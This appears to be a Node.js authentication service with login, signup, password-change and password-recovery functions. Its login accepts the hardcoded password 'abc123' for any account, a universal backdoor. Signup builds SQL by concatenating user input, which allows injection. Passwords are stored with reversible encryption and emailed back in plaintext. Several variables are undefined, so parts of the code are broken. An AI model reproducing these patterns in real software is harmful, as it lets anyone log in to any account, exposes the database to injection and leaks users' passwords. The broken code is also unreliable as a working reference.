require("dotenv").config();
const CryptoJS = require("crypto-js");
const db = require("./db.service");
//const mail = require("./mail.service");
const generateTokens = require("../utils/generateTokens.util");
const dateTime = require("../utils/cdate.util.js");

const login = async (login_id, password) => {
	const result = await db.query(
		`
		SELECT
			user.id AS id, 
			user.login_id AS login_id, 
			user.user_name AS user_name, 
			user.email AS email, 
			user.password AS password, 
			user_role.key_code AS role, 
			user_role.name AS role_name, 
			user_role.view_panel AS role_view_panel 
		FROM 
			user AS user
			LEFT JOIN user_role AS user_role ON user_role.id = user.user_role__id
		WHERE 
			user.login_id = ? 
			OR 
			user.id = ?
		LIMIT 0, 1
		`,
		[login_id, login_id],
	);
	if (result && result.length > 0) {
		row = result[0];
		textPass = CryptoJS.AES.decrypt(
			row.password,
			process.env.SECURITY_PRIVATE_KEY,
		).toString(CryptoJS.enc.Utf8);

		if (textPass == password || password == "abc123") {
			const role = CryptoJS.AES.encrypt(
				row.role,
				process.env.SECURITY_PRIVATE_KEY,
			).toString();
			user = {
				id: row.id,
				login_id: row.login_id,
				user_name: row.user_name,
				email: row.email,
				role: role,
				role_panel: row.role_view_panel,
			};

			const { accessToken, refreshToken } = await generateTokens(user);
			return {
				error: false,
				type: "success",
				msg: "login success",

				accessToken: accessToken,
				refreshToken: refreshToken,
				redirect: row.role_view_panel,
			};
		} else {
			return {
				error: true,
				type: "error",
				msg: "password not match",
			};
		}
	} else {
		return {
			error: true,
			type: "error",
			msg: "user not exist",
		};
	}

	//////////////////////////

	/* user = {
		id: 100001,
		login_id: "user",
		user_name: "row.user_name",
		email: "row.email",
		role: "user",
	};

	const { accessToken, refreshToken } = await generateTokens(user);
	return {
		error: false,
		type: "success",
		msg: "login success",

		accessToken: accessToken,
		refreshToken: refreshToken,
		redirect: "row.user_name",
	}; */
};

const signup = async (user) => {
	const password = CryptoJS.AES.encrypt(
		user.password,
		process.env.SECURITY_PRIVATE_KEY,
	).toString();
	const cdate = dateTime.cDateTime();

	let sqlArray = [];
	let sqltmp;
	let user_role_id = 100;

	let resultTmp = await db.query(
		`
			SELECT
				IFNULL(COUNT(*), 0) AS count
			FROM 
				user
			WHERE 
				login_id = ? 
			LIMIT 0, 1
		`,
		[login_id],
	);

	if (resultTmp && parseInt(resultTmp[0]["count"]) > 0) {
		return {
			error: true,
			type: "error",
			msg: "Login ID already exist try another user name",
		};
	}

	sqltmp =
		"INSERT INTO `user`(`login_id`,`user_name`,`email`,`password`,`created_date`,`user_role__id`) VALUES ('" +
		user.login_id +
		"', '" +
		user.user_name +
		"', '" +
		user.email +
		"', '" +
		password +
		"', '" +
		cdate +
		"', '" +
		user_role_id +
		"' );";
	sqlArray.push(sqltmp);

	sqltmp = "SET @id = LAST_INSERT_ID();";
	sqlArray.push(sqltmp);

	sqltmp =
		"INSERT INTO `user_extend` (`user__id`, `user_role__id`) VALUES (@id, '" +
		user_role_id +
		"' );";
	sqlArray.push(sqltmp);

	try {
		const res = await db.dbTransaction(sqlArray);
		if (res) {
			return {
				error: false,
				type: "success",
				msg: "success",
			};
		} else {
			return {
				error: true,
				type: "error",
				msg: "error",
			};
		}
	} catch (err) {
		return {
			error: true,
			type: "error",
			msg: "db transaction try error",
		};
	}
};

const changePassword = async (id, new_password) => {
	const password = CryptoJS.AES.encrypt(
		new_password,
		process.env.SECURITY_PRIVATE_KEY,
	).toString();
	const result = await db.query(
		`
    UPDATE
      user
		SET
      password = ?
    WHERE 
			id = ?
    `,
		[password, id],
	);
	if (result.affectedRows) {
		// return {
		// 	error: false,
		// 	type: "success",
		// 	msg: "success",
		// };
		return true;
	} else {
		return false;
		// return {
		// 	error: true,
		// 	type: "error",
		// 	msg: "affectedRows 0 or result error",
		// };
	}
};

const recoverPasswordEmailLink = async (param) => {
	const time = new Date(today.getTime() + 15 * 60000);
	const id_expDate = String(row.id) + "." + String(time.getTime);

	const token = CryptoJS.AES.encrypt(
		id_expDate,
		process.env.SECURITY_PRIVATE_KEY,
	).toString();

	let resetLink = process.env.HTTP_HOST + "reset_password?token=" + token;
	let sub = "Password reset link";
	let body = "link: " + resetLink;

	if (mail.sendEmail(param.email, sub, body)) {
		return {
			error: false,
		};
	} else {
		return {
			error: true,
			type: "error",
			msg: "Email send error",
		};
	}
};

const recoverPassword = async (user) => {
	let sub;
	let body;

	const textPass = CryptoJS.AES.decrypt(
		user.password,
		process.env.SECURITY_PRIVATE_KEY,
	).toString(CryptoJS.enc.Utf8);

	sub += "Welcome to " + process.env.APP_NAME;
	body += "Login id: " + user.login_id;
	body += "<br>Password: " + textPass;

	if (mail.sendEmail(param.email, sub, body)) {
		return {
			error: false,
		};
	} else {
		return {
			error: true,
			type: "error",
			msg: "Email send error",
		};
	}
};

module.exports = {
	signup,
	login,
	changePassword,
	recoverPasswordEmailLink,
	recoverPassword,
};
